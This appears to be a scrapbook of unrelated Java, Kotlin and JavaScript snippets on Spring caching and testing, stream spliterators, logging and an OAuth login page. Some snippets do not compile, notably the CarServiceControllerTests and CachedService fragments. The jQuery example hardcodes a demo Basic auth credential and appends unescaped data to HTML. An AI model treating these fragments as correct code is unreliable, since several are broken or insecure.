      return new GuavaCache(CACHE_TWO, CacheBuilder.newBuilder()
            .expireAfterWrite(60, TimeUnit.SECONDS)
            .build());
   }
}
@Service
public class CachedService extends WebServiceGatewaySupport implements CachedService {

    @Inject
    private RestTemplate restTemplate;


    @Cacheable(CacheConfig.CACHE_ONE)
    public String getCached() {

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);

        HttpEntity<String> reqEntity = new HttpEntity<>("url", headers);

        ResponseEntity<String> response;

        String url = "url";
        response = restTemplate.exchange(
                url,
                HttpMethod.GET, reqEntity, String.class);

        return response.getBody();
    }
}

@EnableCaching
@Configuration
public class CacheConfiguration implements CachingConfigurer {

    @Override
    public CacheManager cacheManager() {
        ConcurrentMapCacheManager cacheManager = new ConcurrentMapCacheManager() {

            @Override
            protected Cache createConcurrentMapCache(final String name) {
                return new ConcurrentMapCache(name,
                    CacheBuilder.newBuilder().expireAfterWrite(30, TimeUnit.MINUTES).maximumSize(100).build().asMap(), false);
            }
        };

        return cacheManager;
    }

    @Override
    public KeyGenerator keyGenerator() {
        return new DefaultKeyGenerator();
    }

}
--------------------------------------------------------------------------------------------------------
public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();
    Spliterator<? extends T> lastSpliterator = spliterator;

    // Note that this method does not work very well with:
    // unsized parallel streams when used with skip methods.
    // on that cases it will answer Optional.empty.

    // Find the last spliterator with estimate size
    // Meaningfull only on unsized parallel streams
    if(spliterator.estimateSize() == Long.MAX_VALUE) {
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            lastSpliterator = prev;
        }
    }

    // Find the last spliterator on sized streams
    // Meaningfull only on parallel streams (note that unsized was transformed in sized)
    for (Spliterator<? extends T> prev = lastSpliterator.trySplit(); prev != null; prev = lastSpliterator.trySplit()) {
        if (lastSpliterator.estimateSize() == 0) {
            lastSpliterator = prev;
            break;
        }
    }

    // Find the last element of the last spliterator
    // Parallel streams only performs operation on one element
    AtomicReference<T> last = new AtomicReference<>();
    lastSpliterator.forEachRemaining(last::set);

    return Optional.ofNullable(last.get());
}
Unit testing using junit 5:

@Test
@DisplayName("last sequential sized")
void last_sequential_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last sequential unsized")
void last_sequential_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last parallel sized")
void last_parallel_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("getLast parallel unsized")
void last_parallel_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("last parallel unsized with skip")
void last_parallel_unsized_with_skip() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    // Unfortunately unsized parallel streams does not work very well with skip
    //assertThat(Streams.last(stream)).hasValue(expected);
    //assertThat(count).hasValue(1);

    // @Holger implementation gives wrong answer!!
    //assertThat(Streams.getLast(stream)).hasValue(9_950_000L); //!!!
    //assertThat(count).hasValue(1);

    // This is also not a very good answer better
    assertThat(Streams.last(stream)).isEmpty();
    assertThat(count).hasValue(0);
}

public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();

    // Find the last spliterator with estimate size (sized parallel streams)
    if(spliterator.hasCharacteristics(Spliterator.SIZED|Spliterator.SUBSIZED)) {
        // Find the last spliterator on sized streams (parallel streams)
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            if (spliterator.getExactSizeIfKnown() == 0) {
                spliterator = prev;
                break;
            }
        }
    }

    // Find the last element of the spliterator
    //AtomicReference<T> last = new AtomicReference<>();
    //spliterator.forEachRemaining(last::set);

    //return Optional.ofNullable(last.get());

    // A better one that supports native parallel streams
    return (Optional<T>) StreamSupport.stream(spliterator, stream.isParallel())
            .reduce((a, b) -> b);
}



Parallel unsized streams with 'skip' methods are tricky and the @Holger's implementation gives a wrong answer. Also @Holger's implementation is a bit slower because it uses iterators.

An optimisation of @Holger answer:

public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();
    Spliterator<? extends T> lastSpliterator = spliterator;

    // Note that this method does not work very well with:
    // unsized parallel streams when used with skip methods.
    // on that cases it will answer Optional.empty.

    // Find the last spliterator with estimate size
    // Meaningfull only on unsized parallel streams
    if(spliterator.estimateSize() == Long.MAX_VALUE) {
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            lastSpliterator = prev;
        }
    }

    // Find the last spliterator on sized streams
    // Meaningfull only on parallel streams (note that unsized was transformed in sized)
    for (Spliterator<? extends T> prev = lastSpliterator.trySplit(); prev != null; prev = lastSpliterator.trySplit()) {
        if (lastSpliterator.estimateSize() == 0) {
            lastSpliterator = prev;
            break;
        }
    }

    // Find the last element of the last spliterator
    // Parallel streams only performs operation on one element
    AtomicReference<T> last = new AtomicReference<>();
    lastSpliterator.forEachRemaining(last::set);

    return Optional.ofNullable(last.get());
}
Unit testing using junit 5:

@Test
@DisplayName("last sequential sized")
void last_sequential_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last sequential unsized")
void last_sequential_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last parallel sized")
void last_parallel_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("getLast parallel unsized")
void last_parallel_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("last parallel unsized with skip")
void last_parallel_unsized_with_skip() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    // Unfortunately unsized parallel streams does not work very well with skip
    //assertThat(Streams.last(stream)).hasValue(expected);
    //assertThat(count).hasValue(1);

    // @Holger implementation gives wrong answer!!
    //assertThat(Streams.getLast(stream)).hasValue(9_950_000L); //!!!
    //assertThat(count).hasValue(1);

    // This is also not a very good answer better
    assertThat(Streams.last(stream)).isEmpty();
    assertThat(count).hasValue(0);
}
The only solution to support both's scenarios is to avoid detecting the last spliterator on unsized parallel streams. The consequence is that the solution will perform operations on all elements but it will give always the right answer.

Note that in sequential streams, it will anyway perform operations on all elements.

public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();

    // Find the last spliterator with estimate size (sized parallel streams)
    if(spliterator.hasCharacteristics(Spliterator.SIZED|Spliterator.SUBSIZED)) {
        // Find the last spliterator on sized streams (parallel streams)
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            if (spliterator.getExactSizeIfKnown() == 0) {
                spliterator = prev;
                break;
            }
        }
    }

    // Find the last element of the spliterator
    //AtomicReference<T> last = new AtomicReference<>();
    //spliterator.forEachRemaining(last::set);

    //return Optional.ofNullable(last.get());

    // A better one that supports native parallel streams
    return (Optional<T>) StreamSupport.stream(spliterator, stream.isParallel())
            .reduce((a, b) -> b);
}
With regard to the unit testing for that implementation, the first three tests are exactly the same (sequential & sized parallel). The tests for unsized parallel are here:

@Test
@DisplayName("last parallel unsized")
void last_parallel_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(10_000_000L);
}

@Test
@DisplayName("last parallel unsized with skip")
void last_parallel_unsized_with_skip() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}
--------------------------------------------------------------------------------------------------------
System.lineSeparator()
System.getProperty("line.separator")

rhyme = line1 + "&#10;" + line2;
rhyme = line1 + "&#10;&#13;" + line2;
--------------------------------------------------------------------------------------------------------
if(LOGGER.isInfoEnabled()) {
    String message = MessageFormat.format("Bad experience for user {0} at time {1} while accessing {2}", user, Calendar.getInstance().getTime(), application);
    LOGGER.info(message);
}
--------------------------------------------------------------------------------------------------------
  private static Logger LOGGER = null;

  static {
      InputStream stream = MyClass.class.getClassLoader().
              getResourceAsStream("logging.properties");
      try {
          LogManager.getLogManager().readConfiguration(stream);
          LOGGER= Logger.getLogger(MyClass.class.getName());

      } catch (IOException e) {
          e.printStackTrace();
      }
  }
  
  
  
    private static Logger LOGGER = null;

  static {
      System.setProperty("java.util.logging.SimpleFormatter.format",
              "[%1$tF %1$tT] [%4$-7s] %5$s %n");
      LOGGER = Logger.getLogger(MyClass2.class.getName());
  }
  
  
  
    private static Logger LOGGER = null;

  static {
      Logger mainLogger = Logger.getLogger("com.logicbig");
      mainLogger.setUseParentHandlers(false);
      ConsoleHandler handler = new ConsoleHandler();
      handler.setFormatter(new SimpleFormatter() {
          private static final String format = "[%1$tF %1$tT] [%2$-7s] %3$s %n";

          @Override
          public synchronized String format(LogRecord lr) {
              return String.format(format,
                      new Date(lr.getMillis()),
                      lr.getLevel().getLocalizedName(),
                      lr.getMessage()
              );
          }
      });
      mainLogger.addHandler(handler);
      LOGGER = Logger.getLogger(MyClass3.class.getName());
  }
  
  @Import({MailCacheConfiguration.class})
--------------------------------------------------------------------------------------------------------
 public static void main (String[] args) {
        List<String> list = new ArrayList<>();

        Spliterator<String> s = list.spliterator();

        if(s.hasCharacteristics(Spliterator.ORDERED)){
            System.out.println("ORDERED");
        }
        if(s.hasCharacteristics(Spliterator.DISTINCT)){
            System.out.println("DISTINCT");
        }
        if(s.hasCharacteristics(Spliterator.SORTED)){
            System.out.println("SORTED");
        }
        if(s.hasCharacteristics(Spliterator.SIZED)){
            System.out.println("SIZED");
        }

        if(s.hasCharacteristics(Spliterator.CONCURRENT)){
            System.out.println("CONCURRENT");
        }
        if(s.hasCharacteristics(Spliterator.IMMUTABLE)){
            System.out.println("IMMUTABLE");
        }
        if(s.hasCharacteristics(Spliterator.NONNULL)){
            System.out.println("NONNULL");
        }
        if(s.hasCharacteristics(Spliterator.SUBSIZED)){
            System.out.println("SUBSIZED");
        }
    }
--------------------------------------------------------------------------------------------------------
Stream<Integer> unfolded = StreamUtils.unfold(1, i ->
    (i < 10)
        ? Optional.of(i + 1)
        : Optional.empty());

assertThat(unfolded.collect(Collectors.toList()),
           contains(1, 2, 3, 4, 5, 6, 7, 8, 9, 10));
		   
Stream<String> streamA = Stream.of("A", "B", "C");
Stream<String> streamB  = Stream.of("Apple", "Banana", "Carrot", "Doughnut");

List<String> zipped = StreamUtils.zip(streamA,
                                      streamB,
                                      (a, b) -> a + " is for " + b)
                                 .collect(Collectors.toList());

assertThat(zipped,
           contains("A is for Apple", "B is for Banana", "C is for Carrot"));
		   
Stream<Integer> ints = Stream.of(1,2,3,4,5,6,7,8,9,10);
Stream<Integer> skipped = StreamUtils.skipWhile(ints, i -> i < 4);

List<Integer> collected = skipped.collect(Collectors.toList());

assertThat(collected,
           contains(4, 5, 6, 7, 8, 9, 10));
		   
Stream<Integer> infiniteInts = Stream.iterate(0, i -> i + 1);
Stream<Integer> finiteInts = StreamUtils.takeWhile(infiniteInts, i -> i < 10);

assertThat(finiteInts.collect(Collectors.toList()),
           hasSize(10));
		   

--------------------------------------------------------------------------------------------------------
 public static void main (String[] args) {
     int[] ints = {3,4,6,7};
     Spliterator.OfInt s = Arrays.spliterator(ints);
     s.forEachRemaining((IntConsumer) System.out::println);
 }
--------------------------------------------------------------------------------------------------------
List<Item> operatedList = new ArrayList<>();
itemList.stream()
  .filter(item -> item.isQualified())
  .forEach(item -> {
    item.operate();
    operatedList.add(item);
});
itemList.removeAll(operatedList);
--------------------------------------------------------------------------------------------------------
List<Integer> integers = Lists.mutable.with(1, 2, 3, 4, 5);
int index = Iterate.detectIndex(integers, i -> i > 2);
if (index > -1) {
    integers.remove(index);
}

Assert.assertEquals(Lists.mutable.with(1, 2, 4, 5), integers);
--------------------------------------------------------------------------------------------------------
Map<Boolean, List<String>> classifiedElements = names
    .stream()
    .collect(Collectors.partitioningBy((String e) -> 
      !e.startsWith("A")));
 
String matching = String.join(",",
  classifiedElements.get(true));
String nonMatching = String.join(",",
  classifiedElements.get(false));
--------------------------------------------------------------------------------------------------------
package com.mkyong;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;

public class test {
	public static void main(String[] args){

	try {
		File fileDir = new File("c:\\temp\\test.txt");
			
		BufferedReader in = new BufferedReader(
		   new InputStreamReader(
                      new FileInputStream(fileDir), "UTF8"));
		        
		String str;
		      
		while ((str = in.readLine()) != null) {
		    System.out.println(str);
		}
		        
                in.close();
	    } 
	    catch (UnsupportedEncodingException e) 
	    {
			System.out.println(e.getMessage());
	    } 
	    catch (IOException e) 
	    {
			System.out.println(e.getMessage());
	    }
	    catch (Exception e)
	    {
			System.out.println(e.getMessage());
	    }
	}
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = { MyConfigurationPropertiesTest_1.TestConfiguration.class })
@ActiveProfiles("happy-path")
public class MyConfigurationPropertiesTest_1 {
 
    @Autowired
    private MyConfigurationProperties properties;
 
    @Test
    public void should_Populate_MyConfigurationProperties() {
        assertThat(properties.getSomeMandatoryProperty()).isEqualTo("123456");
        assertThat(properties.getSomeOptionalProperty()).isEqualTo("abcdef");
        assertThat(properties.getSomeDefaultProperty()).isEqualTo("overwritten");
    }
 
    @EnableConfigurationProperties(MyConfigurationProperties.class)
    public static class TestConfiguration {
        // nothing
    }
}
 
application-happy-path.yml:
    my:
      properties:
        some_mandatory_property: "123456"
        some_optional_property: "abcdef"
        some_default_property: "overwritten"
--------------------------------------------------------------------------------------------------------
@TestPropertySource(properties={"spring.autoconfigure.exclude=comma.seperated.ClassNames,com.example.FooAutoConfiguration"})
@EnableAutoConfiguration(exclude = IntegrationAutoConfiguration.class)

javax.mail.StoreClosedException: * BYE JavaMail Exception: java.io.IOException: Connection dropped by server?
	at com.sun.mail.imap.IMAPFolder.throwClosedException(IMAPFolder.java:3732)
	at com.sun.mail.imap.IMAPFolder.doCommand(IMAPFolder.java:3866)
	at com.sun.mail.imap.IMAPFolder.exists(IMAPFolder.java:590)
	at org.springframework.integration.mail.AbstractMailReceiver.openFolder(AbstractMailReceiver.java:324)
	at org.springframework.integration.mail.ImapMailReceiver.waitForNewMessages(ImapMailReceiver.java:170)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$IdleTask.run(ImapIdleChannelAdapter.java:289)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$ReceivingTask.run(ImapIdleChannelAdapter.java:254)
	at org.springframework.scheduling.support.DelegatingErrorHandlingRunnable.run(DelegatingErrorHandlingRunnable.java:54)
	at org.springframework.scheduling.concurrent.ReschedulingRunnable.run(ReschedulingRunnable.java:93)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
	
java.lang.IllegalStateException: Failure in 'idle' task. Will resubmit.
	at org.springframework.integration.mail.ImapIdleChannelAdapter$IdleTask.run(ImapIdleChannelAdapter.java:305)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$ReceivingTask.run(ImapIdleChannelAdapter.java:254)
	at org.springframework.scheduling.support.DelegatingErrorHandlingRunnable.run(DelegatingErrorHandlingRunnable.java:54)
	at org.springframework.scheduling.concurrent.ReschedulingRunnable.run(ReschedulingRunnable.java:93)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
Caused by: javax.mail.StoreClosedException: * BYE JavaMail Exception: java.io.IOException: Connection dropped by server?
	at com.sun.mail.imap.IMAPFolder.throwClosedException(IMAPFolder.java:3732)
	at com.sun.mail.imap.IMAPFolder.doCommand(IMAPFolder.java:3866)
	at com.sun.mail.imap.IMAPFolder.exists(IMAPFolder.java:590)
	at org.springframework.integration.mail.AbstractMailReceiver.openFolder(AbstractMailReceiver.java:324)
	at org.springframework.integration.mail.ImapMailReceiver.waitForNewMessages(ImapMailReceiver.java:170)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$IdleTask.run(ImapIdleChannelAdapter.java:289)
	... 10 common frames omitted
--------------------------------------------------------------------------------------------------------
@Configuration
@Profile("dev")
public class StandaloneDataConfig {

	@Bean
	public DataSource dataSource() {
		return new EmbeddedDatabaseBuilder()
			.setType(EmbeddedDatabaseType.HSQL)
			.addScript("classpath:com/bank/config/sql/schema.sql")
			.addScript("classpath:com/bank/config/sql/test-data.sql")
			.build();
	}
}
--------------------------------------------------------------------------------------------------------
package com.example;

@RunWith(SpringJUnit4ClassRunner.class)
// ApplicationContext will be loaded from the static inner ContextConfiguration class
@ContextConfiguration(loader=AnnotationConfigContextLoader.class)
public class OrderServiceTest {

    @Configuration
    static class ContextConfiguration {

        // this bean will be injected into the OrderServiceTest class
        @Bean
        public OrderService orderService() {
            OrderService orderService = new OrderServiceImpl();
            // set properties, etc.
            return orderService;
        }
    }

    @Autowired
    private OrderService orderService;

    @Test
    public void testOrderService() {
        // test the orderService
    }
}
--------------------------------------------------------------------------------------------------------
import com.paragon.microservices.crmmailadapter.test.annotation.SpringBootTestConfiguration;
import org.junit.Ignore;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.junit4.SpringRunner;

import static org.junit.Assert.assertEquals;

@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@SpringBootTestConfiguration
public class ActuatorInfoTest {

    @Autowired
    private TestRestTemplate restTemplate;

    @Ignore
    @Test
    public void whenGetInfo_thenReturns200() {
        final ResponseEntity<String> responseEntity = this.restTemplate.getForEntity("/actuator/info", String.class);
        assertEquals(HttpStatus.OK, responseEntity.getStatusCode());
    }

    @Ignore
    @Test
    public void whenFeatures_thenReturns200() {
        final ResponseEntity<String> responseEntity = this.restTemplate.getForEntity("/actuator/features", String.class);
        assertEquals(HttpStatus.OK, responseEntity.getStatusCode());
    }
}
--------------------------------------------------------------------------------------------------------
ArgumentCaptor<MyFunctionalInterface> lambdaCaptor = ArgumentCaptor.forClass(MyFunctionalInterface.class);

verify(bar).useLambda(lambdaCaptor.capture());

// Not retrieve captured arg (which is reference to lamdba).
MyFuntionalRef usedLambda = lambdaCaptor.getValue();

// Now you have reference to actual lambda that was passed, validate its behavior.
verifyMyLambdaBehavior(usedLambda);
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@WebMvcTest(CarServiceController.class)
public class CarServiceControllerTests {

    @Autowired
    private MockMvc mvc;

    @MockBean
    private CarService carService;

    @Test
    public void getCarShouldReturnCarDetails() {
        given(this.carService.schedulePickup(new Date(), new Route());)
            .willReturn(new Date());

        this.mvc.perform(get("/schedulePickup")
            .accept(MediaType.JSON)
            .andExpect(status().isOk());
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
public class RetryTemplateBeanPostProcessor implements BeanPostProcessor {

    public static final String DEFAULT_RETRY_TEMPLATE_BEAN_NAME = "retryTemplate";

    @Nullable
    @Override
    public Object postProcessAfterInitialization(final Object bean, final String beanName) throws BeansException {
        if (StringUtils.equalsIgnoreCase(beanName, DEFAULT_RETRY_TEMPLATE_BEAN_NAME)) {
            ((RetryTemplate) bean).setThrowLastExceptionOnExhausted(true);
        }
        return bean;
    }
}
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
@Import({ProcessExecutorConfig.class})
public class App {
 
	public static void main(String[] args) {
		SpringApplication app = new SpringApplication(App.class);
		app.addInitializers(new CustomAppCtxInitializer());
		ConfigurableApplicationContext ctx = app.run();
	}
 
	private static class CustomAppCtxInitializer
			implements ApplicationContextInitializer<GenericApplicationContext> {
 
		@Override
		public void initialize(GenericApplicationContext applicationContext) {
			applicationContext
					.getDefaultListableBeanFactory()
					.setAllowBeanDefinitionOverriding(false);
		} 
	}
}
--------------------------------------------------------------------------------------------------------
spring.main.allow-bean-definition-overriding=true
--------------------------------------------------------------------------------------------------------
  /*
   *           N777777777NO
   *         N7777777777777N
   *        M777777777777777N
   *        $N877777777D77777M
   *       N M77777777ONND777M
   *       MN777777777NN  D777
   *     N7ZN777777777NN ~M7778
   *    N777777777777MMNN88777N
   *    N777777777777MNZZZ7777O
   *    DZN7777O77777777777777
   *     N7OONND7777777D77777N
   *      8$M++++?N???$77777$
   *       M7++++N+M77777777N
   *        N77O777777777777$                              M
   *          DNNM$$$$777777N                              D
   *         N$N:=N$777N7777M                             NZ
   *        77Z::::N777777777                          ODZZZ
   *       77N::::::N77777777M                         NNZZZ$
   *     $777:::::::77777777MN                        ZM8ZZZZZ
   *     777M::::::Z7777777Z77                        N++ZZZZNN
   *    7777M:::::M7777777$777M                       $++IZZZZM
   *   M777$:::::N777777$M7777M                       +++++ZZZDN
   *     NN$::::::7777$$M777777N                      N+++ZZZZNZ
   *       N::::::N:7$O:77777777                      N++++ZZZZN
   *       M::::::::::::N77777777+                   +?+++++ZZZM
   *       8::::::::::::D77777777M                    O+++++ZZ
   *        ::::::::::::M777777777N                      O+?D
   *        M:::::::::::M77777777778                     77=
   *        D=::::::::::N7777777777N                    777
   *       INN===::::::=77777777777N                  I777N
   *      ?777N========N7777777777787M               N7777
   *      77777$D======N77777777777N777N?         N777777
   *     I77777$$$N7===M$$77777777$77777777$MMZ77777777N
   *      $$$$$$$$$$$NIZN$$$$$$$$$M$$7777777777777777ON
   *       M$$$$$$$$M    M$$$$$$$$N=N$$$$7777777$$$ND
   *      O77Z$$$$$$$     M$$$$$$$$MNI==$DNNNNM=~N
   *   7 :N MNN$$$$M$      $$$777$8      8D8I
   *     NMM.:7O           777777778
   *                       7777777MN
   *                       M NO .7:
   *                       M   :   M
   *                            8
   */

--------------------------------------------------------------------------------------------------------
    public static void main(String[] args) {
        final byte[] expected = "fo".getBytes(StandardCharsets.US_ASCII);
        byte[] dst = new byte[expected.length];
        Base64.getMimeDecoder().decode("Zm8=\r\n".getBytes(StandardCharsets.US_ASCII), dst);
    }
--------------------------------------------------------------------------------------------------------
val file = File(Uri.parse(resources.openRawResource(R.raw.rec1).toString()).toString())
        var encodedBase64: String? = null
        try {
            val fileInputStreamReader = FileInputStream(file)
            val bytes = ByteArray(file.length().toInt())
            fileInputStreamReader.read(bytes)
            val result = Base64.encodeToString(bytes, Base64.DEFAULT)

            println("result--" + result)
        } catch (e: FileNotFoundException) {
            e.printStackTrace()
        } catch (e: IOException) {
            e.printStackTrace()
        }
--------------------------------------------------------------------------------------------------------
@Configuration
@ConditionalOnExpression(
    "${module.enabled:true} and ${module.submodule.enabled:true}"
)
class SubModule {
  ...
}
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
public class SpringBootComponentScanApp {
    private static ApplicationContext applicationContext;
 
    @Bean
    public ExampleBean exampleBean() {
        return new ExampleBean();
    }
 
    public static void main(String[] args) {
        applicationContext = SpringApplication.run(SpringBootComponentScanApp.class, args);
        checkBeansPresence("cat", "dog", "rose", "exampleBean", "springBootComponentScanApp");
 
    }
 
    private static void checkBeansPresence(String... beans) {
        for (String beanName : beans) {
            System.out.println("Is " + beanName + " in ApplicationContext: " + 
              applicationContext.containsBean(beanName));
        }
    }
}
--------------------------------------------------------------------------------------------------------
var oauthToken = null;

function login() {
    var userLogin = $('#loginField').val();
    var userPassword = $('#passwordField').val();
    console.log ( '#someButton was clicked' );
    $.post({
        url: 'http://localhost:8080/app/rest/v2/oauth/token',
        headers: {
            'Authorization': 'Basic Y2xpZW50OnNlY3JldA==',
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        dataType: 'json',
        data: {grant_type: 'password', username: userLogin, password: userPassword},
        success: function (data) {
            oauthToken = data.access_token;
            $('#loggedInStatus').show();
            $('#loginForm').hide();
            loadRecentOrders();
        }
    })
}

function loadRecentOrders() {
    $.get({
        url: 'http://localhost:8080/app/rest/v2/entities/workshop$Order?view=_local',
        headers: {
            'Authorization': 'Bearer ' + oauthToken,
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        success: function (data) {
            $('#recentOrders').show();
            $.each(data, function (i, order) {
                $('#ordersList').append("<li>" + order.description + "</li>");
            });
        }
    });
}

@ConfigurationProperties("app.system")
public class AppSystemProperties {

	@DurationUnit(ChronoUnit.SECONDS)
	private Duration sessionTimeout = Duration.ofSeconds(30);

	private Duration readTimeout = Duration.ofMillis(1000);

	public Duration getSessionTimeout() {
		return this.sessionTimeout;
	}

	public void setSessionTimeout(Duration sessionTimeout) {
		this.sessionTimeout = sessionTimeout;
	}

	public Duration getReadTimeout() {
		return this.readTimeout;
	}

	public void setReadTimeout(Duration readTimeout) {
		this.readTimeout = readTimeout;
	}

}
@ConfigurationProperties("app.io")
public class AppIoProperties {

	@DataSizeUnit(DataUnit.MEGABYTES)
	private DataSize bufferSize = DataSize.ofMegabytes(2);

	private DataSize sizeThreshold = DataSize.ofBytes(512);

	public DataSize getBufferSize() {
		return this.bufferSize;
	}

	public void setBufferSize(DataSize bufferSize) {
		this.bufferSize = bufferSize;
	}

	public DataSize getSizeThreshold() {
		return this.sizeThreshold;
	}

	public void setSizeThreshold(DataSize sizeThreshold) {
		this.sizeThreshold = sizeThreshold;
	}
}
